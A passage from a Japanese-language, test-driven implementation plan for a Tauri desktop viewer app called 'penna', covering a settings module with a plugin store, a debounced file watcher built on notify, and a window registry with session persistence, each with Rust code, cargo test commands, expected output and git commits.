test result: ok. 1 passed; 0 failed; ...
```

- [ ] **Step 9: FileKind の serde 直列化を検証するテストを追加する（Red→Green を一度に確認）**

契約上 `FileKind` は `"Markdown"` / `"PlainText"` という文字列に、`LoadedFile` のフィールドはそのままの名前で直列化される必要がある。`serde_json` でラウンドトリップ検証する。

`src-tauri/src/loader.rs` の `mod tests` 内に追記:

```rust
    #[test]
    fn file_kind_serializes_as_variant_name() {
        assert_eq!(serde_json::to_string(&FileKind::Markdown).unwrap(), "\"Markdown\"");
        assert_eq!(serde_json::to_string(&FileKind::PlainText).unwrap(), "\"PlainText\"");
    }

    #[test]
    fn loaded_file_serializes_expected_fields() {
        let lf = LoadedFile {
            path: "/tmp/a.md".to_string(),
            text: "x".to_string(),
            encoding: "UTF-8".to_string(),
            kind: FileKind::Markdown,
        };
        let json = serde_json::to_string(&lf).unwrap();
        assert_eq!(
            json,
            r#"{"path":"/tmp/a.md","text":"x","encoding":"UTF-8","kind":"Markdown"}"#
        );
    }
```

Run:

```bash
cd src-tauri && cargo test --lib loader::tests 2>&1 | tail -12
```

Expected (PASS — loader の全テストが緑になる):

```
test loader::tests::detect_kind_recognizes_markdown_extensions ... ok
test loader::tests::detect_kind_treats_others_as_plain_text ... ok
test loader::tests::file_kind_serializes_as_variant_name ... ok
test loader::tests::load_file_decodes_shift_jis ... ok
test loader::tests::load_file_decodes_utf16le_bom ... ok
test loader::tests::load_file_decodes_utf8 ... ok
test loader::tests::loaded_file_serializes_expected_fields ... ok

test result: ok. 7 passed; 0 failed; ...
```

Commit:

```bash
git add src-tauri/src/loader.rs
git commit -m "test: verify FileKind and LoadedFile serde serialization"
```

未検証事項・残リスク: この環境では Rust ツールチェインが未設定のため、上記の `cargo test` は実環境で初めて実行される。特に Step 7 の chardetng による Shift_JIS 判定はバイト列長に依存する確率的判定であり、`encoding == "Shift_JIS"` にならない場合は同ステップ記載のとおり繰り返し回数を増やして対処する（実装の変更は不要）。`encoding_rs` の正規名は `Shift_JIS` / `UTF-16LE` / `UTF-8` で安定している。

### Task 4: Rust 設定モジュール（settings.rs）の実装

このタスクでは `src-tauri/src/settings.rs` を契約どおりに実装する。`Theme` enum（serde は `rename_all = "lowercase"`）、`Settings` struct（serde は `rename_all = "camelCase"`）とその `Default` 実装、そして `tauri-plugin-store` v2 を用いた `load_settings` / `save_settings` を作る。

全体の流れ:
1. 依存クレート（serde / serde_json / tauri-plugin-store）を `Cargo.toml` に追加。
2. `Settings::default()` の値を検証する失敗テストを先に書く（RED）。
3. `Theme` / `Settings` / `Default` を実装してテストを通す（GREEN）。
4. serde の round-trip（camelCase キー、`theme` が `"system"`）を検証する失敗テストを書く（RED）。
5. serde 属性を確認・調整して通す（GREEN）。
6. JSON オブジェクトからの deserialize を検証する失敗テストを書く（RED）。
7. それを通す（GREEN）。
8. `load_settings` / `save_settings`（tauri-plugin-store v2）を実装する。
9. `settings.rs` をモジュール登録してコミット。

なお `load_settings` / `save_settings` は実行中の Tauri アプリ（`AppHandle`）を要するため単体テストの対象外とし、純粋な serde ロジック（`Settings::default()` と `serde_json` の往復）だけを単体テストする（AREA-SPECIFIC NOTES の方針どおり）。

---

- [ ] **Step 1: 依存クレートを Cargo.toml に追加する**

`src-tauri/Cargo.toml` の `[dependencies]` セクションに以下を追記する（既に同名の行があれば重複させず、無いものだけ足す）。`features = ["derive"]` は serde の derive マクロに必須。

```toml
[dependencies]
serde = { version = "1", features = ["derive"] }
serde_json = "1"
tauri-plugin-store = "2"
```

Run:

```bash
cargo --version && cargo metadata --no-deps --format-version=1 --manifest-path src-tauri/Cargo.toml >/dev/null && echo OK
```

Expected: `cargo 1.x...` のあとに `OK`（manifest が壊れていないことの確認）。

---

- [ ] **Step 2: Default 値を検証する失敗テストを先に書く（RED）**

`src-tauri/src/settings.rs` を新規作成し、まずテストモジュールだけを書く（本体はまだ存在しないのでコンパイルエラー＝RED）。

```rust
// src-tauri/src/settings.rs

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_settings_match_contract() {
        let s = Settings::default();
        assert!(matches!(s.theme, Theme::System));
        assert_eq!(s.session_restore, false);
        assert_eq!(s.auto_reload, true);
        assert_eq!(s.font_family, None);
        assert_eq!(s.font_size, 16);
        assert_eq!(s.default_encoding, "UTF-8");
    }
}
```

Run:

```bash
cargo test --manifest-path src-tauri/Cargo.toml settings:: 2>&1 | tail -n 20
```

Expected: FAIL（`cannot find type Settings in this scope` / `cannot find type Theme in this scope` などのコンパイルエラーでビルド不成立）。

---

- [ ] **Step 3: Theme / Settings / Default を実装してテストを通す（GREEN）**

`src-tauri/src/settings.rs` のファイル先頭（テストモジュールより上）に本体を追加する。`Settings` のフィールドは契約上 `pub` 指定が無いので非公開フィールドとし、同一クレート内（テスト・他モジュール）からは利用できるが外部クレートからは触れない形にする。テストは同ファイル内 `mod tests` なので非公開フィールドにアクセスできる。

```rust
// src-tauri/src/settings.rs
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Theme {
    System,
    Light,
    Dark,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Settings {
    theme: Theme,
    session_restore: bool,
    auto_reload: bool,
    font_family: Option<String>,
    font_size: u32,
    default_encoding: String,
}

impl Default for Settings {
    fn default() -> Self {
        Self {
            theme: Theme::System,
            session_restore: false,
            auto_reload: true,
            font_family: None,
            font_size: 16,
            default_encoding: "UTF-8".to_string(),
        }
    }
}

impl Settings {
    /// セッション復元が ON か（spec §5、起動振り分けで参照する。既定 false）。
    pub fn session_restore(&self) -> bool {
        self.session_restore
    }
}
```

Run:

```bash
cargo test --manifest-path src-tauri/Cargo.toml settings::tests::default_settings_match_contract 2>&1 | tail -n 20
```

Expected: PASS（`test settings::tests::default_settings_match_contract ... ok` / `test result: ok. 1 passed`）。

---

- [ ] **Step 4: serde シリアライズ（camelCase / lowercase）の失敗テストを書く（RED）**

`mod tests` 内に round-trip 用テストを追記する。`serde_json::Value` に変換し、camelCase キーと `theme` が `"system"` になることを検証する。`serde_json` を dev でも使うため `use` を test モジュール冒頭に置く。

```rust
    #[test]
    fn serializes_to_camel_case_keys() {
        let s = Settings::default();
        let v = serde_json::to_value(&s).expect("serialize");
        let obj = v.as_object().expect("object");

        // camelCase キーが存在する
        assert!(obj.contains_key("sessionRestore"));
        assert!(obj.contains_key("autoReload"));
        assert!(obj.contains_key("fontFamily"));
        assert!(obj.contains_key("fontSize"));
        assert!(obj.contains_key("defaultEncoding"));
        assert!(obj.contains_key("theme"));

        // snake_case キーは存在しない（rename が効いている確認）
        assert!(!obj.contains_key("session_restore"));
        assert!(!obj.contains_key("default_encoding"));

        // 値の確認
        assert_eq!(v["theme"], serde_json::json!("system"));
        assert_eq!(v["fontSize"], serde_json::json!(16));
        assert_eq!(v["defaultEncoding"], serde_json::json!("UTF-8"));
        assert_eq!(v["fontFamily"], serde_json::Value::Null);
    }
```

Run:

```bash
cargo test --manifest-path src-tauri/Cargo.toml settings::tests::serializes_to_camel_case_keys 2>&1 | tail -n 20
```

Expected: PASS（Step 3 の serde 属性が既に正しいため通る。ここで FAIL する場合は `rename_all` の綴り・配置を見直す。`test result: ok. 1 passed`）。

注: このユニットはテストを先に書く順序（テスト→確認）を踏んでおり、Step 3 の実装が契約どおりかをこのテストで固定する。仮に Step 3 で `rename_all` を付け忘れていれば `sessionRestore` キーが見つからず FAIL するため、属性のリグレッション検出として機能する。

---

- [ ] **Step 5: JSON オブジェクトからの deserialize を検証するテストを書いて通す**

`mod tests` 内に、外部から来る camelCase JSON を `Settings` に復元できることを検証するテストを追記する。

```rust
    #[test]
    fn deserializes_from_camel_case_json() {
        let json = serde_json::json!({
            "theme": "dark",
            "sessionRestore": true,
            "autoReload": false,
            "fontFamily": "JetBrains Mono",
            "fontSize": 18,
            "defaultEncoding": "Shift_JIS"
        });

        let s: Settings = serde_json::from_value(json).expect("deserialize");
        assert!(matches!(s.theme, Theme::Dark));
        assert_eq!(s.session_restore, true);
        assert_eq!(s.auto_reload, false);
        assert_eq!(s.font_family, Some("JetBrains Mono".to_string()));
        assert_eq!(s.font_size, 18);
        assert_eq!(s.default_encoding, "Shift_JIS");
    }
```

Run:

```bash
cargo test --manifest-path src-tauri/Cargo.toml settings::tests::deserializes_from_camel_case_json 2>&1 | tail -n 20
```

Expected: PASS（`test result: ok. 1 passed`）。`Theme` の `rename_all = "lowercase"` により `"dark"` が `Theme::Dark` に復元される。

---

- [ ] **Step 6: load_settings / save_settings を tauri-plugin-store v2 で実装する**

`src-tauri/src/settings.rs` の本体（`impl Default` の直後、`#[cfg(test)] mod tests` より上）に store 連携関数を追加する。tauri-plugin-store v2 では `StoreExt` トレイトを `use` すると `app.store("settings.json")` が使える。`get` は `Option<serde_json::Value>` を返し、`set` で値を入れ、`save` で永続化する。設定が無い／壊れている場合は契約どおり `Default` を返す。

```rust
use tauri::AppHandle;
use tauri_plugin_store::StoreExt;

const STORE_FILE: &str = "settings.json";
const STORE_KEY: &str = "settings";

pub fn load_settings(app: &AppHandle) -> Settings {
    let store = match app.store(STORE_FILE) {
        Ok(store) => store,
        Err(_) => return Settings::default(),
    };

    match store.get(STORE_KEY) {
        Some(value) => serde_json::from_value(value).unwrap_or_default(),
        None => Settings::default(),
    }
}

pub fn save_settings(app: &AppHandle, s: &Settings) -> Result<(), String> {
    let store = app.store(STORE_FILE).map_err(|e| e.to_string())?;
    let value = serde_json::to_value(s).map_err(|e| e.to_string())?;
    store.set(STORE_KEY, value);
    store.save().map_err(|e| e.to_string())
}
```

Run:

```bash
cargo build --manifest-path src-tauri/Cargo.toml 2>&1 | tail -n 20
```

Expected: ビルド成功（`Finished ...`）。`load_settings`/`save_settings` の型が `tauri` / `tauri-plugin-store` の API に整合していることをコンパイルで確認する（これらは実行中アプリを要するため単体テストは付けない）。

---

- [ ] **Step 7: settings モジュールをクレートに登録する**

`src-tauri/src/lib.rs`（Tauri v2 の標準ライブラリエントリ）にモジュール宣言を追加する。既に他タスクで宣言済みなら重複させない。

```rust
// src-tauri/src/lib.rs の先頭付近、他の mod 宣言と並べて
mod settings;
```

Run:

```bash
cargo test --manifest-path src-tauri/Cargo.toml settings:: 2>&1 | tail -n 20
```

Expected: 3 件すべて PASS（`test result: ok. 3 passed; 0 failed`）。`mod settings;` 経由でテストが発見・実行されることを確認する。

---

- [ ] **Step 8: コミットする**

変更（`settings.rs`、`Cargo.toml`、`lib.rs` のモジュール宣言）をステージしてコミットする。

```bash
git add src-tauri/src/settings.rs src-tauri/Cargo.toml src-tauri/src/lib.rs
git commit -m "feat(settings): add Settings/Theme model and store-backed load/save"
```

Expected: コミット成功（1 file or 3 files changed）。コミット前に `git diff --staged` で意図しない差分が無いことを確認する。

### Task 5: watcher.rs — notify ベースのファイル監視とデバウンス

このタスクでは `src-tauri/src/watcher.rs` を契約どおり実装する。中核は「150ms の静穏時間が経過したか」を判定する純粋な `Debouncer` 構造体で、テストでは実時計を一切呼ばず `now`（u128 ミリ秒）を引数注入して決定的に検証する。`watch_file` は `notify` v6 の `RecommendedWatcher` をファイルパスに張り、modify イベントを `Debouncer` 経由で間引いてから `loader::load_file` で再読込し、`app.emit_to(&window_label, "file-changed", loaded_file)` でウィンドウへ送る。remove/rename では `app.emit_to(&window_label, "file-removed", { path })` を送る。

前提: `loader.rs`（`load_file` / `LoadedFile` / `FileKind`）が Task 1〜4 で実装済みであること。`Cargo.toml` に `notify = "6"` と `serde`（`derive` feature 付き）が含まれていること。`tauri` の `Emitter` トレイトを use して `emit_to` を呼ぶ。

#### 全体の流れ
1. `Debouncer` の失敗するテストを書く（2 イベント 50ms 差は合体 / 200ms 差は両方発火） → FAIL を確認
2. `Debouncer` を最小実装 → PASS を確認
3. `notify` 受信ループ・イベント分類・emit を含む `watch_file` / `DocWatcher` を実装（実 FS タイミングに依存しない `Debouncer` はそのまま再利用）
4. ビルド確認 → commit

---

- [ ] **Step 5.1: `Cargo.toml` に notify を追加する**

`src-tauri/Cargo.toml` の `[dependencies]` に `notify` を追記する（既に存在する場合はスキップ）。

```toml
[dependencies]
notify = "6"
```

- [ ] **Step 5.2: `watcher.rs` に `Debouncer` の失敗するテストを先に書く**

`src-tauri/src/watcher.rs` を新規作成し、まずは `Debouncer` の単体テストだけを置く。`Debouncer::new(quiet_ms)` を生成し、`should_emit(now_ms: u128) -> bool` を呼ぶたびに「直前の発火受理時刻」を更新する設計を前提にする。注入した `now` で完全に決定的に検証する（実時計を呼ばない）。

```rust
// src-tauri/src/watcher.rs

// (Debouncer の実装はこの後の Step で追加する)

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn first_event_always_emits() {
        let mut d = Debouncer::new(150);
        assert!(d.should_emit(1_000), "最初のイベントは必ず発火する");
    }

    #[test]
    fn events_within_quiet_window_coalesce() {
        let mut d = Debouncer::new(150);
        assert!(d.should_emit(1_000), "最初のイベントは発火");
        // 50ms 後 (< 150ms) のイベントは合体して発火しない
        assert!(!d.should_emit(1_050), "150ms 未満の連続イベントは合体する");
    }

    #[test]
    fn events_after_quiet_window_both_fire() {
        let mut d = Debouncer::new(150);
        assert!(d.should_emit(1_000), "最初のイベントは発火");
        // 200ms 後 (>= 150ms) のイベントは静穏時間を満たすので発火
        assert!(d.should_emit(1_200), "150ms 以上空いたイベントは発火する");
    }

    #[test]
    fn suppressed_event_does_not_reset_last_emit() {
        let mut d = Debouncer::new(150);
        assert!(d.should_emit(1_000), "t=1000 発火");
        assert!(!d.should_emit(1_050), "t=1050 は合体（発火しない）");
        // 直近の発火受理は t=1000 のまま。t=1160 は 1000 から 160ms 経過し発火する
        assert!(d.should_emit(1_160), "抑制されたイベントは last_emit を進めない");
    }
}
```

Run:
```bash
cd src-tauri && cargo test --lib watcher::tests 2>&1 | tail -20
```
Expected: コンパイルエラーで FAIL（`cannot find type Debouncer in this scope` 等。`Debouncer` 未定義のため）。

- [ ] **Step 5.3: `Debouncer` を最小実装してテストを通す**

`watcher.rs` の先頭（`#[cfg(test)] mod tests` の前）に `Debouncer` を追加する。`now` は呼び出し側から渡す u128 ミリ秒で、内部で時計を呼ばない純粋ロジックにする。

```rust
// src-tauri/src/watcher.rs

/// modify イベントの多重発火を間引くための純粋なデバウンス判定。
/// `now` 呼び出し側から渡す u128 ミリ秒で、内部では時計を呼ばない。
/// これによりテストを決定的に書ける（契約: 静穏時間 150ms）。
struct Debouncer {
    quiet_ms: u128,
    last_emit_ms: Option<u128>,
}

impl Debouncer {
    fn new(quiet_ms: u128) -> Self {
        Self {
            quiet_ms,
            last_emit_ms: None,
        }
    }

    /// `now_ms` 時点でイベントを発火すべきなら true を返し、内部の発火時刻を更新する。
    /// 発火しない（合体する）場合は false を返し、last_emit は据え置く。
    fn should_emit(&mut self, now_ms: u128) -> bool {
        let fire = match self.last_emit_ms {
            None => true,
            Some(last) => now_ms.saturating_sub(last) >= self.quiet_ms,
        };
        if fire {
            self.last_emit_ms = Some(now_ms);
        }
        fire
    }
}
```

Run:
```bash
cd src-tauri && cargo test --lib watcher::tests 2>&1 | tail -20
```
Expected: PASS（`test result: ok. 4 passed; 0 failed`）。

- [ ] **Step 5.4: commit（テストと Debouncer 実装）**

```bash
cd src-tauri && cargo fmt && cd .. && git add src-tauri/Cargo.toml src-tauri/src/watcher.rs && git commit -m "test: add Debouncer with injected-clock unit tests for watcher"
```

- [ ] **Step 5.5: `watch_file` / `DocWatcher` を実装する（notify + emit）**

`Debouncer` 実装の直下（`#[cfg(test)] mod tests` の前）に、imports・イベントペイロード・`DocWatcher`・`watch_file` を追加する。`notify` v6 の `recommended_watcher` でコールバック型ウォッチャを作り、対象ファイルを `RecursiveMode::NonRecursive` で監視する。コールバック内で `Instant` 由来の経過ミリ秒を `Debouncer` に渡し、modify は load して `file-changed`、remove/rename は `file-removed` を `emit_to` で送る。`RecommendedWatcher` は drop されると監視を止めるため `DocWatcher` に保持する。

`watcher.rs` の先頭に置く use 群:

```rust
// src-tauri/src/watcher.rs (ファイル先頭の use 群)
use crate::loader;
use notify::{Event, EventKind, RecommendedWatcher, RecursiveMode, Watcher};
use serde::Serialize;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use std::time::Instant;
use tauri::{AppHandle, Emitter};
```

`Debouncer` の下に追加する本体:

```rust
// src-tauri/src/watcher.rs (Debouncer の直後、tests の前)

/// "file-removed" イベントのペイロード（契約: { path: String }）。
#[derive(Clone, Serialize)]
struct RemovedPayload {
    path: String,
}

/// 1 つのファイルを監視するハンドル。`RecommendedWatcher` を保持し続けることで
/// 監視を生かす（drop で監視停止）。
pub struct DocWatcher {
    _watcher: RecommendedWatcher,
}

/// `path` を監視し、デバウンス後に再読込して `window_label` 宛にイベントを emit する。
/// - modify: `loader::load_file` で再読込し "file-changed"（payload: LoadedFile）
/// - remove / rename: "file-removed"（payload: { path }）
pub fn watch_file(app: AppHandle, window_label: String, path: PathBuf) -> DocWatcher {
    // Instant 起点。コールバックでの経過ミリ秒を Debouncer に渡す（実時計を Debouncer に持ち込まない）。
    let started = Instant::now();
    let debouncer = Arc::new(Mutex::new(Debouncer::new(150)));
    let cb_path = path.clone();

    let mut watcher: RecommendedWatcher =
        notify::recommended_watcher(move |res: notify::Result<Event>| {
            let event = match res {
                Ok(ev) => ev,
                Err(_) => return,
            };

            match event.kind {
                EventKind::Modify(_) | EventKind::Create(_) => {
                    let now_ms = started.elapsed().as_millis();
                    let should = {
                        // Debouncer の lock は短時間だけ保持する。
                        let mut d = match debouncer.lock() {
                            Ok(d) => d,
                            Err(_) => return,
                        };
                        d.should_emit(now_ms)
                    };
                    if !should {
                        return;
                    }
                    match loader::load_file(&cb_path) {
                        Ok(loaded) => {
                            let _ = app.emit_to(&window_label, "file-changed", loaded);
                        }
                        // 読込失敗（保存途中の一時的な空ファイル等）は無視し、次のイベントで再評価する。
                        Err(_) => {}
                    }
                }
                EventKind::Remove(_) => {
                    let payload = RemovedPayload {
                        path: cb_path.to_string_lossy().to_string(),
                    };
                    let _ = app.emit_to(&window_label, "file-removed", payload);
                }
                _ => {}
            }
        })
        .expect("failed to create file watcher");

    // 単一ファイルなので NonRecursive。watch 失敗時もウォッチャ自体は返し、ログのみ残す。
    if let Err(e) = watcher.watch(&path, RecursiveMode::NonRecursive) {
        eprintln!("penna: failed to watch {}: {}", path.display(), e);
    }

    DocWatcher { _watcher: watcher }
}
```

注記: notify v6 はバックエンド（FSEvents/inotify/ReadDirectoryChangesW）ごとに rename を `EventKind::Remove(RemoveKind::Any)` か `Modify(ModifyKind::Name(..))` のどちらで通知するかが異なる。契約は remove/rename を "file-removed" として扱うが、ここでは確実な `Remove(_)` のみを "file-removed" にマップし、`Modify` 由来の rename は再読込側（load_file 失敗→無視）で graceful に倒す。OS 差は E2E/手動スモークで要確認（残リスク）。

- [ ] **Step 5.6: `watch_file` がコンパイル・既存テストを壊さないことを確認する**

`Debouncer` テストは実 FS に依存しないため、`watch_file` 追加後も同じテストがそのまま通ることを確認する（ビルドが通り、4 テストが PASS のまま）。

Run:
```bash
cd src-tauri && cargo test --lib watcher 2>&1 | tail -20
```
Expected: ビルド成功し `test result: ok. 4 passed; 0 failed`。

- [ ] **Step 5.7: clippy で警告がないことを確認する**

```bash
cd src-tauri && cargo clippy --lib 2>&1 | tail -20
```
Expected: `warning` 0 件（watcher 由来の指摘なし）。

- [ ] **Step 5.8: commit（watch_file / DocWatcher 実装）**

```bash
cd src-tauri && cargo fmt && cd .. && git add src-tauri/src/watcher.rs && git commit -m "feat: implement watch_file with notify and debounced file-changed/file-removed events"
```

### Task 6: ウィンドウマネージャ（WindowRegistry / open_document / open_empty_window）と公開コマンド

このタスクでは `src-tauri/src/window.rs` のレジストリとウィンドウ生成、`src-tauri/src/commands.rs` の全 `#[tauri::command]`、そして `lib.rs` への State 登録と invoke_handler 登録を実装する。流れは次の通り: (1) 純粋構造体 `WindowRegistry` のラベル採番・登録・参照・スナップショット/削除ロジックをテスト付きで実装する → (2) Tauri 連携部（`open_document` / `open_empty_window` / `persist_session` とウィンドウクローズ時の登録解除・再永続化）を実装する → (3) コマンドを実装する → (4) `lib.rs` で State と invoke_handler を配線する。Tauri に依存する部分は単体テストできないため、テスト対象はあくまで `WindowRegistry` の純ロジック（採番・登録・参照・`snapshot`・`remove`）に絞る。セッション復元（spec §5、既定 OFF）の最小実装として `snapshot`/`remove`/`persist_session` を用意し、設定 ON 時の復元振り分けは Task 7 の `open_first_launch` が担う。

- [ ] **Step 1: テスト付きで `WindowRegistry` を実装する**

`WindowRegistry` を「`Mutex<HashMap<String, PathBuf>>` と `AtomicUsize` を内部に持つが、テストでは純粋なメソッド（`next_label` / `register` / `path_for` / `snapshot` / `remove`）として検証できる構造体」として設計する。本体と単体テストを同時に書き、テストが GREEN になることを確認する（純ロジックのため実装とテストを 1 ステップで確定させる）。

`src-tauri/src/window.rs`:

```rust
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Mutex;

/// ウィンドウ label -> 開いているファイルパス の対応表。
/// label は "doc-1", "doc-2", ... と単調増加で採番する。
/// Tauri State として `app.manage` で共有する想定だが、
/// 採番・登録・参照ロジックは Tauri 非依存の純粋メソッドに切り出してテスト可能にする。
pub struct WindowRegistry {
    counter: AtomicUsize,
    paths: Mutex<HashMap<String, PathBuf>>,
}

impl WindowRegistry {
    pub fn new() -> Self {
        Self {
            counter: AtomicUsize::new(0),
            paths: Mutex::new(HashMap::new()),
        }
    }

    /// 次のウィンドウ label を採番して返す。呼ぶたびに "doc-1", "doc-2", ... と増える。
    pub fn next_label(&self) -> String {
        let n = self.counter.fetch_add(1, Ordering::SeqCst) + 1;
        format!("doc-{n}")
    }

    /// label に対してファイルパスを登録する。
    pub fn register(&self, label: &str, path: PathBuf) {
        self.paths
            .lock()
            .expect("window registry mutex poisoned")
            .insert(label.to_string(), path);
    }

    /// label に紐づく登録済みパスを返す。未登録なら None（空ウィンドウ）。
    pub fn path_for(&self, label: &str) -> Option<PathBuf> {
        self.paths
            .lock()
            .expect("window registry mutex poisoned")
            .get(label)
            .cloned()
    }

    /// 現在登録済みの全パスのスナップショット（セッション復元用）。順不同。
    pub fn snapshot(&self) -> Vec<PathBuf> {
        self.paths
            .lock()
            .expect("window registry mutex poisoned")
            .values()
            .cloned()
            .collect()
    }

    /// label の登録を解除する（ウィンドウクローズ時）。
    pub fn remove(&self, label: &str) {
        self.paths
            .lock()
            .expect("window registry mutex poisoned")
            .remove(label);
    }
}

impl Default for WindowRegistry {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn next_label_increments_monotonically() {
        let reg = WindowRegistry::new();
        assert_eq!(reg.next_label(), "doc-1");
        assert_eq!(reg.next_label(), "doc-2");
        assert_eq!(reg.next_label(), "doc-3");
    }

    #[test]
    fn register_then_path_for_returns_path() {
        let reg = WindowRegistry::new();
        reg.register("doc-1", PathBuf::from("/tmp/a.md"));
        assert_eq!(reg.path_for("doc-1"), Some(PathBuf::from("/tmp/a.md")));
    }

    #[test]
    fn path_for_unregistered_label_is_none() {
        let reg = WindowRegistry::new();
        assert_eq!(reg.path_for("doc-99"), None);
    }

    #[test]
    fn register_overwrites_existing_label() {
        let reg = WindowRegistry::new();
        reg.register("doc-1", PathBuf::from("/tmp/a.md"));
        reg.register("doc-1", PathBuf::from("/tmp/b.md"));
        assert_eq!(reg.path_for("doc-1"), Some(PathBuf::from("/tmp/b.md")));
    }

    #[test]
    fn snapshot_returns_all_registered_paths() {
        let reg = WindowRegistry::new();
        reg.register("doc-1", PathBuf::from("/tmp/a.md"));
        reg.register("doc-2", PathBuf::from("/tmp/b.md"));
        let mut snap = reg.snapshot();
        snap.sort();
        assert_eq!(
            snap,
            vec![PathBuf::from("/tmp/a.md"), PathBuf::from("/tmp/b.md")]
        );
    }

    #[test]
    fn remove_drops_label_from_snapshot() {
        let reg = WindowRegistry::new();
        reg.register("doc-1", PathBuf::from("/tmp/a.md"));
        reg.register("doc-2", PathBuf::from("/tmp/b.md"));
        reg.remove("doc-1");
        assert_eq!(reg.path_for("doc-1"), None);
        assert_eq!(reg.snapshot(), vec![PathBuf::from("/tmp/b.md")]);
    }
}
```

Run:

```bash
cargo test --manifest-path src-tauri/Cargo.toml window::tests
```

Expected: コンパイルが通り、6 テストすべて PASS する（`test result: ok. 6 passed; 0 failed`）。本ステップは本体とテストを同時に確定させる方針のため Expected は PASS。なお RED-first を厳密に踏みたい場合は、いったんテストだけを書いて `cargo test` を走らせ未定義シンボルでコンパイルエラー（FAIL）を確認してから上記実装を貼ってもよい（任意・記録用の補足）。

- [ ] **Step 2: `WindowRegistry` テストを通す（最小実装の確認）**

Step 1 で実装も含めて貼ったため、ここではテストが GREEN であることを確認するだけ。`window.rs` をモジュールとして認識させるため `lib.rs` に宣言を追加する。

`src-tauri/src/lib.rs`（既存の `mod` 宣言群に追記）:

```rust
mod window;
```

Run:

```bash
cargo test --manifest-path src-tauri/Cargo.toml window::tests
```

Expected:

```
running 6 tests
test window::tests::next_label_increments_monotonically ... ok
test window::tests::path_for_unregistered_label_is_none ... ok
test window::tests::register_then_path_for_returns_path ... ok
test window::tests::register_overwrites_existing_label ... ok
test window::tests::snapshot_returns_all_registered_paths ... ok
test window::tests::remove_drops_label_from_snapshot ... ok

test result: ok. 6 passed; 0 failed
```

- [ ] **Step 3: コミット（レジストリの純ロジック）**

```bash
git add src-tauri/src/window.rs src-tauri/src/lib.rs
git commit -m "feat(window): add WindowRegistry with tested label/register/lookup logic"
```

- [ ] **Step 4: `open_document` / `open_empty_window` を実装する**

Tauri 連携部を追加する。`open_document` は `WindowRegistry`（State）から label を採番 → `WebviewWindowBuilder` で `index.html` を読み込むウィンドウを生成 → label->path を登録 → `watcher::watch_file` で監視を開始する。`open_empty_window` はパスを登録しない（フロント側で `window_path` が None を受け取りドロップゾーンを表示する）。`watcher::watch_file` の戻り値 `DocWatcher` は生かしておかないとドロップされて監視が止まるため、`WindowRegistry` とは別に `Mutex<HashMap<String, DocWatcher>>` の保管庫を持たせて延命する。

`src-tauri/src/window.rs` の冒頭 `use` を差し替え、ファイル末尾の `#[cfg(test)]` の直前に Tauri 連携部を追加する。

冒頭 `use` を以下へ差し替え:

```rust
use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Mutex;

use tauri::{Manager, WebviewUrl, WebviewWindowBuilder};

use crate::watcher::{self, DocWatcher};
```

`WindowRegistry` に監視ハンドルの保管庫を追加する。`struct` 定義と `new` を以下へ差し替え:

```rust
pub struct WindowRegistry {
    counter: AtomicUsize,
    paths: Mutex<HashMap<String, PathBuf>>,
    watchers: Mutex<HashMap<String, DocWatcher>>,
}

impl WindowRegistry {
    pub fn new() -> Self {
        Self {
            counter: AtomicUsize::new(0),
            paths: Mutex::new(HashMap::new()),
            watchers: Mutex::new(HashMap::new()),
        }
    }
```

監視ハンドルを延命させるヘルパーを `impl WindowRegistry` 内（`path_for` の後ろ）に追加:

```rust
    /// ウィンドウに紐づく監視ハンドルを保持してドロップを防ぐ（監視を生かす）。
    fn keep_watcher(&self, label: &str, watcher: DocWatcher) {
        self.watchers
            .lock()
            .expect("window registry watchers mutex poisoned")
            .insert(label.to_string(), watcher);
    }
```

`#[cfg(test)]` モジュールの直前に Tauri 連携関数を追加:

```rust
/// 指定ファイルを新規ウィンドウで開く。
/// label を採番し index.html を読み込むウィンドウを生成、label->path を登録、監視を開始する。
/// ウィンドウクローズ時に label を登録解除してセッションを再永続化する。
/// 戻り値は生成したウィンドウの label。
pub fn open_document(app: &tauri::AppHandle, path: PathBuf) -> Result<String, String> {
    let registry = app.state::<WindowRegistry>();
    let label = registry.next_label();

    let window = WebviewWindowBuilder::new(app, &label, WebviewUrl::App("index.html".into()))
        .title("penna")
        .build()
        .map_err(|e| format!("failed to build window: {e}"))?;

    registry.register(&label, path.clone());

    let watcher = watcher::watch_file(app.clone(), label.clone(), path);
    registry.keep_watcher(&label, watcher);

    // ウィンドウが閉じられたら登録を外し、セッション（sessionPaths）を再永続化する。
    let close_app = app.clone();
    let close_label = label.clone();
    window.on_window_event(move |event| {
        if matches!(
            event,
            tauri::WindowEvent::Destroyed | tauri::WindowEvent::CloseRequested { .. }
        ) {
            let registry = close_app.state::<WindowRegistry>();
            registry.remove(&close_label);
            persist_session(&close_app);
        }
    });

    // 開いた直後にも現在のセッションを永続化する（session_restore が ON のとき復元に使う）。
    persist_session(app);

    Ok(label)
}

/// ファイル未指定の空ウィンドウを開く。パスは登録しないため、
/// フロント側は window_path で None を受け取りドロップゾーンを表示する。
pub fn open_empty_window(app: &tauri::AppHandle) -> Result<String, String> {
    let registry = app.state::<WindowRegistry>();
    let label = registry.next_label();

    WebviewWindowBuilder::new(app, &label, WebviewUrl::App("index.html".into()))
        .title("penna")
        .build()
        .map_err(|e| format!("failed to build window: {e}"))?;

    Ok(label)
}

/// 現在登録済みのファイルパス集合を settings.json ストアの "sessionPaths" に書き出す。
/// session_restore が ON のとき、次回起動でこの集合を開き直す。
pub fn persist_session(app: &tauri::AppHandle) {
    let registry = app.state::<WindowRegistry>();
    let paths: Vec<String> = registry
        .snapshot()
        .into_iter()
        .map(|p| p.to_string_lossy().into_owned())
        .collect();
    if let Ok(store) = app.store("settings.json") {
        store.set("sessionPaths", serde_json::json!(paths));
        let _ = store.save();
    }
}
```

`persist_session` は `tauri_plugin_store::StoreExt`（`app.store(...)`）を使うため、`window.rs` 冒頭の `use` に追記する:

```rust
use tauri_plugin_store::StoreExt;
```
